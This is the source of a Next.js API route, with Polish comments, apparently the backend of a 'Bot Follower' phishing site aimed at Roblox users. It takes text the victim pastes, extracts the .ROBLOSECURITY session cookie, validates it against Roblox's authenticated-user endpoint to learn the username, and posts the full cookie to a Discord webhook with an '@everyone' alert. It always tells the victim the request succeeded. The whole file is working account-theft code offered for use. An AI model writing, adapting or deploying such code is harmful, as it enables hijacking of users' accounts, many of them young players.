// pages/api/release.js   (lub app/api/release/route.js – w zależności od struktury projektu)

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { text } = req.body;

    if (!text || typeof text !== 'string' || text.trim().length < 20) {
      return res.status(400).json({ error: 'No valid input provided' });
    }

    // Próba wyciągnięcia samego tokenu .ROBLOSECURITY z różnych formatów
    let cookie = text.trim();

    // Typowe formaty wklejane przez ludzi:
    // 1. Czysty token: _|WARNING:-DO-NOT-SHARE-THIS...
    // 2. Cookie: .ROBLOSECURITY=...
    // 3. Cały string z ostrzeżeniem

    if (cookie.includes('.ROBLOSECURITY=')) {
      cookie = cookie.split('.ROBLOSECURITY=')[1].split(';')[0].trim();
    } else if (cookie.includes('_|WARNING')) {
      // usuwamy początek ostrzeżenia jeśli jest
      cookie = cookie.replace(/^_\|WARNING:[^|]*\|\s*/, '').trim();
    }

    // Minimalna walidacja – token Roblox zazwyczaj zaczyna się od _|
    if (!cookie.startsWith('_|')) {
      return res.status(400).json({ error: 'Does not look like a .ROBLOSECURITY token' });
    }

    const webhookUrl = process.env.WEBHOOK_URL;
    if (!webhookUrl) {
      console.error('WEBHOOK_URL not set in environment variables');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    // Sprawdzamy cookie i pobieramy username
    let username = '??? (could not verify)';
    let userId = null;

    try {
      const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (compatible; RobloxCookieChecker)'
        },
        redirect: 'manual'
      });

      if (authRes.ok) {
        const data = await authRes.json();
        username = data.name || data.displayName || 'Authenticated (no name)';
        userId = data.id || null;
      } else if (authRes.status === 401) {
        username = 'Invalid / Expired cookie';
      } else {
        username = `Error ${authRes.status}`;
      }
    } catch (fetchErr) {
      console.error('Roblox API fetch error:', fetchErr);
      username = 'API request failed';
    }

    // Przygotowujemy embed
    const embed = {
      title: 'NEW COOKIE – Bot Follower',
      color: 0xFF0000, // czerwony
      fields: [
        {
          name: 'Username',
          value: username + (userId ? ` (ID: ${userId})` : ''),
          inline: true
        },
        {
          name: '.ROBLOSECURITY',
          value: '```' + cookie.substring(0, 200) + (cookie.length > 200 ? '...' : '') + '```',
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: 'Bot Follower • Cookie received'
      }
    };

    // Wysyłamy do Discorda
    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [embed]
      })
    });

    if (!discordRes.ok) {
      console.error('Discord webhook failed:', await discordRes.text());
    }

    // Zawsze zwracamy sukces do frontendu (żeby pokazało zielony komunikat)
    return res.status(200).json({ status: 'ok' });

  } catch (err) {
    console.error('API error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
